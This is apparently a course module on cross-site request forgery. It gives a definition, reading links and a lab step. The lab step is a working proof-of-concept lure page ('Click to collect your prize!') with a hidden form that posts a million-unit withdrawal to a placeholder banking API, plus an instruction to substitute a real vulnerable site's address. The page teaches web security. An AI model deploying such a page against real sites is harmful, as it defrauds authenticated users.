# Cross-Site Request Forgery (XSRF/CSRF) attacks 

<!-- vscode-markdown-toc -->
* 1. [Objectives](#Objectives)
* 2. [Documentation](#Documentation)
* 3. [Bibliography](#Bibliography)

<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc --> 

##  1. <a name='Objectives'></a>Objectives

##  2. <a name='Documentation'></a>Documentation
Cross-site request forgery (also known as XSRF or CSRF, pronounced see-surf) is an attack against web-hosted apps whereby a malicious web app can influence the interaction between a client browser and a web app that trusts that browser. These attacks are possible because web browsers send some types of authentication tokens automatically with every request to a website. This form of exploit is also known as a one-click attack or session riding because the attack takes advantage of the user's previously authenticated session.

> Recommended further reading: OWASP (description of the vulnerability in general): https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF); CSRF in ASP.NET: https://docs.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-2.2 

# Malicious or infected web site

> :octocat: Full source code available, check the `8 - Vulnerabilities - CSRF (Cross-Site Request Forgery)` folder.

1. Create an `html` file with the following content.

    ```HTML
    <!DOCTYPE html>
    <html>
    <head>
        <title>Malicious or infected web site</title>
    </head>
        <body style="text-align:center;">

            <img src="winner.jpg">

            <h1>Congratulations!</h1>
            <h1>You have won a Samsung Galaxy Fold (2.000 euros)!!!!</h1>
            <form action="http://good-banking-site.com/api/account" method="post">
                <input type="hidden" name="Transaction" value="withdraw">
                <input type="hidden" name="Amount" value="1000000">
                <input type="submit" value="Click to collect your prize!">
            </form>


        </body>
    </html>
    ```

2. You will need to replace "http://good-banking-site.com/api/account" with the actual address of the vulnerable website.

##  3. <a name='Bibliography'></a>Bibliography
- Prevent Cross-Site Request Forgery (XSRF/CSRF) attacks in ASP.NET Core: https://docs.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?
- OWASP CSRF: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)